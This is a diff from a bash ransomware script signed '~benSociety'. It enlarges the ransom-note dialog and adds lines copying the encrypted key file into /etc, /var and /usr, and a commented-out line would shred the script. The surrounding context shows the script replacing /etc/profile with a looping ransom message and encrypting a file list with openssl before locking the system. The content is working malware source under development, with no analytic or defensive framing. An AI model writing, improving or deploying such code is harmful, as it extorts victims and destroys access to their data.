@@ -147,7 +147,7 @@ dec_loop() {
 }
 ################# MAIN ######################################
 setmsg() {
-    msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 20 30;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
+    msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 10 50;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
     mv /etc/profile /etc/profile.bak
     echo $msg > /etc/profile
 }
@@ -170,6 +170,10 @@ main() {
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
     setmsg
+    cp $PRIVATEKEY /etc/
+    cp $PRIVATEKEY /var/
+    cp $PRIVATEKEY /usr/
+    #shred $0
     lock
     EXIT
 }
